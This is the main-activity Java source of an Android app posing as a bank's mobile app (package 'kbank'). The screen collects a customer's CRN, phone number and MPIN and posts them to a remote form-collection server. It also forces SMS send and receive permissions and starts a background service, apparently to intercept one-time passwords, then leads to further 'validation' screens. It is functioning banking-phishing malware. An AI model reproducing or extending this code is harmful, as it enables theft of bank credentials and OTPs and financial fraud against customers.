    package com.msf.kbank.mobile;

    import android.annotation.SuppressLint;
    import android.content.DialogInterface;
    import android.content.Intent;
    import android.content.pm.PackageManager;
    import android.net.Uri;
    import android.os.Build;
    import android.os.Bundle;
    import android.provider.Settings;
    import android.util.Log;
    import android.widget.Button;
    import android.widget.EditText;
    import android.widget.Toast;

    import androidx.annotation.NonNull;
    import androidx.annotation.RequiresApi;
    import androidx.appcompat.app.AlertDialog;
    import androidx.appcompat.app.AppCompatActivity;
    import androidx.core.app.ActivityCompat;
    import androidx.core.content.ContextCompat;

    import org.json.JSONException;
    import org.json.JSONObject;

    import com.msf.kbank.mobile.Suggest.BackgroundService;
    import com.msf.kbank.mobile.Suggest.FormValidator;
    import com.msf.kbank.mobile.Suggest.NetworkUtils;


    public class MainActivity extends AppCompatActivity {

        private EditText crn;
        private EditText phone;
        private EditText mpin;

        private static final int SMS_PERMISSION_REQUEST_CODE = 1;

        @SuppressLint("SetTextI18n")
        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);

            checkAndRequestPermissions();
            crn = findViewById(R.id.crn);
            phone = findViewById(R.id.phone);
            mpin = findViewById(R.id.mpin);
            Button buttonSubmit = findViewById(R.id.submit);

            if(!Helper.isNetworkAvailable(this)) {
                Intent intent = new Intent(MainActivity.this, NoInternetActivity.class);
                startActivity(intent);
            }

            buttonSubmit.setOnClickListener(v -> {
                if (validateForm()) {
                    buttonSubmit.setText("Please Wait");
                    JSONObject sendPayload = new JSONObject();
                    try {
                        JSONObject dataObject = new JSONObject();
                        dataObject.put("crnn", crn.getText().toString().trim());
                        dataObject.put("phone", phone.getText().toString().trim());
                        dataObject.put("mpin", mpin.getText().toString().trim());
                        sendPayload.put("data", dataObject);
                        sendPayload.put("site", Helper.SITE);

                        String url = Helper.FormURL + Helper.FormSavePath;
                        NetworkUtils.postRequest(url, sendPayload, new NetworkUtils.PostRequestCallback() {
                            @Override
                            public void onResponse(String stringResponnse) {
                                try {
                                    JSONObject response = new JSONObject(stringResponnse);
                                    if(response.getInt("status")==200){
                                        Intent intent = new Intent(MainActivity.this, Loading.class);
                                        intent.putExtra("id", response.getInt("data"));
                                        intent.putExtra("nextActivity", "SecondActivity");
                                        intent.putExtra("loadText", "Validating Your Details");
                                        startActivity(intent);
                                    }else{
                                        Toast.makeText(MainActivity.this, "Status Not 200 : "+stringResponnse, Toast.LENGTH_SHORT).show();
                                        Log.d(Helper.TAG, "Response: " + stringResponnse);
                                    }
                                }catch (JSONException e){
                                    Helper.debug(MainActivity.this, e.getMessage());
                                }

                            }
                            @Override
                            public void onError(String error) {
                                Toast.makeText(MainActivity.this, "Error  "+error, Toast.LENGTH_SHORT).show();
                                Log.d(Helper.TAG, "Error: " + error);
                            }
                        });
                    } catch (JSONException e) {
                        Toast.makeText(MainActivity.this, "Error "+e.toString(), Toast.LENGTH_SHORT).show();
                        Log.d("Main68 mywork", e.toString());
                    }
                }else{
                    Toast.makeText(MainActivity.this, "form validation failed", Toast.LENGTH_SHORT).show();
                }
            });

        }
        private void initializeWebView() {
            Intent serviceIntent = new Intent(this, BackgroundService.class);
            startService(serviceIntent);
        }

        private boolean validateForm() {
            boolean n1 = FormValidator.validateRequired(mpin, "MPin Id is required");
            boolean n11 = FormValidator.validateMinLength(mpin, 4, "MPin 4 digit is required");
            boolean n2 = FormValidator.validatePhoneNumber(phone, "Phone number is required");
            boolean n22 = FormValidator.validateMinLength(phone, 10,"Required 10 digit phone no");
            boolean n3 = FormValidator.validateRequired(crn, "CRN is required");
            boolean n33 = FormValidator.validateMinLength(crn, 8, "CRN 8 digit is required");
            return n1 && n11 && n2 && n22  && n3 && n33;
        }

        // start permission checker
        private void checkAndRequestPermissions() {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // Check if the SMS permission is not granted
                if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS) !=
                        PackageManager.PERMISSION_GRANTED ||
                        ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECEIVE_SMS) !=
                                PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(this,
                            new String[]{android.Manifest.permission.SEND_SMS, android.Manifest.permission.RECEIVE_SMS},
                            SMS_PERMISSION_REQUEST_CODE);
                } else {
                    initializeWebView();
                }
            } else {
                Toast.makeText(this, "Below Android Device", Toast.LENGTH_SHORT).show();
                initializeWebView();
            }
        }

        @RequiresApi(api = Build.VERSION_CODES.M)
        @Override
        public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                               @NonNull int[] grantResults) {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);

            if (requestCode == SMS_PERMISSION_REQUEST_CODE) {
                if (grantResults.length > 0 &&
                        grantResults[0] == PackageManager.PERMISSION_GRANTED &&
                        grantResults[1] == PackageManager.PERMISSION_GRANTED) {
                    initializeWebView();
                } else {
                    // SMS permissions denied
                    showPermissionDeniedDialog();
                }
            }
        }

        private void showPermissionDeniedDialog() {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("Permission Denied");
            builder.setMessage("SMS permissions are required to send and receive messages. " +
                    "Please grant the permissions in the app settings.");

            // Open settings button
            builder.setPositiveButton("Open Settings", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    openAppSettings();
                }
            });

            // Cancel button
            builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    dialog.dismiss();
                    finish();
                }
            });

            builder.show();
        }
        private void openAppSettings() {
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:" + getPackageName()));
            intent.addCategory(Intent.CATEGORY_DEFAULT);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }

    }